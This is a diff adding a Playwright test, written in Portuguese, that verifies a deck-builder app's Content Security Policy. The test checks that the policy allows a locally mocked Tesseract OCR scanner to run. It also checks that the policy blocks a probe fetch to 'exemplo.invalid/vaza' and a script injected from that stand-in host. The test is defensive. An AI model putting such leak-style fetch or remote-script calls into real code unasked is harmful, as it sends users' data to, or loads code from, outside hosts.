@@ -3945,6 +3945,40 @@ test('e2e · P-1 sonda: nome de carta com HTML numa lista colada aparece como te
 });
 
 // Leva 113 · um modo só (motor completo), cores só do deck principal, coleção com o painel primeiro.
+test('e2e · P-3 política de conteúdo: o leitor do scanner de verdade (Tesseract do CDN, worker de blob, WebAssembly, dados do inglês) lê uma carta com a política ligada; script e conexão para origem fora da lista são recusados', { skip }, async t => {
+  const { page, errors, base } = await open(t);
+  // o CDN do leitor vem dos pacotes instalados (mesmas versões que o app pede); nada sai da máquina
+  const NM = join(ROOT, 'node_modules');
+  const arquivo = (p, tipo) => ({ status: 200, contentType: tipo, body: readFileSync(p), headers: { 'access-control-allow-origin': '*' } });
+  await page.context().route('https://cdn.jsdelivr.net/**', r => { const u = new URL(r.request().url()).pathname; let m;
+    if ((m = u.match(/^\/npm\/tesseract\.js@v?5\.1\.1\/dist\/([\w.-]+)$/))) return r.fulfill(arquivo(join(NM, 'tesseract.js/dist', m[1]), 'text/javascript'));
+    if ((m = u.match(/^\/npm\/tesseract\.js-core@v?5\.1\.1\/([\w.-]+)$/))) return r.fulfill(arquivo(join(NM, 'tesseract.js-core', m[1]), m[1].endsWith('.wasm') ? 'application/wasm' : 'text/javascript'));
+    if ((m = u.match(/^\/npm\/@tesseract\.js-data\/eng\/([\w./-]+)$/)) && !m[1].includes('..')) return r.fulfill(arquivo(join(NM, '@tesseract.js-data/eng', m[1]), 'application/octet-stream'));
+    return r.fulfill({ status: 404, body: '' }); });
+  await page.goto(base + '#/');
+  assert.equal(await page.locator('meta[http-equiv="Content-Security-Policy"]').count(), 1);
+  await page.evaluate(() => { window.__violacoes = []; document.addEventListener('securitypolicyviolation', e => window.__violacoes.push(e.violatedDirective + ' ' + e.blockedURI)); });
+  // 1 · o mesmo caminho do app (__m do scanner): script do CDN, createWorker('eng'), reconhecer
+  const lido = await page.evaluate(async () => {
+    await new Promise((res, rej) => { const s = document.createElement('script'); s.src = 'https://cdn.jsdelivr.net/npm/tesseract.js@5.1.1/dist/tesseract.min.js'; s.onload = res; s.onerror = rej; document.head.appendChild(s); });
+    const c = document.createElement('canvas'); c.width = 900; c.height = 160; const g = c.getContext('2d');
+    g.fillStyle = '#fff'; g.fillRect(0, 0, 900, 160); g.fillStyle = '#000'; g.font = 'bold 72px serif'; g.fillText('Counterspell', 40, 110);
+    const le = (async () => { const w = await window.Tesseract.createWorker('eng'); const { data } = await w.recognize(c); await w.terminate(); return data.text; })();
+    // sem a permissão de WebAssembly o leitor não falha, fica parado: o teste desiste em 60 s em vez de esperar o portão
+    return Promise.race([le, new Promise(res => setTimeout(() => res('(o leitor não respondeu em 60 s)'), 60000))]); });
+  assert.match(lido, /Counterspell/i, 'o leitor leu com a política ligada');
+  assert.deepEqual(await page.evaluate(() => window.__violacoes), [], 'o leitor não esbarrou na política');
+  // 2 · sonda: o que não está na lista é recusado (conexão e script)
+  await page.evaluate(async () => { try { await fetch('https://exemplo.invalid/vaza?x=1'); } catch (e) { /* recusado */ }
+    await new Promise(res => { const s = document.createElement('script'); s.src = 'https://exemplo.invalid/x.js'; s.onerror = res; s.onload = res; document.head.appendChild(s); }); });
+  await page.waitForFunction(() => window.__violacoes.length >= 2);
+  const v = await page.evaluate(() => window.__violacoes);
+  assert.ok(v.some(x => /^connect-src https:\/\/exemplo\.invalid/.test(x)), 'conexão recusada: ' + JSON.stringify(v));
+  assert.ok(v.some(x => /^script-src(-elem)? https:\/\/exemplo\.invalid/.test(x)), 'script recusado: ' + JSON.stringify(v));
+  assert.equal(await page.evaluate(() => typeof window.__sonda), 'undefined');
+  assert.deepEqual(errors.filter(e => !/exemplo\.invalid/.test(e)), []);
+});
+
 test('e2e · leva 113 modo único: lista 100% joga no motor completo; lista com carta sem regra não joga e a tela diz qual; cores só do deck principal', { skip }, async t => {
   const { page, errors, base } = await open(t, { dev: false });
   await createDeck(page, base, 'Coberta', '30 Island\n30 Counterspell\n\nSideboard\n4 Lightning Bolt', 'livre');
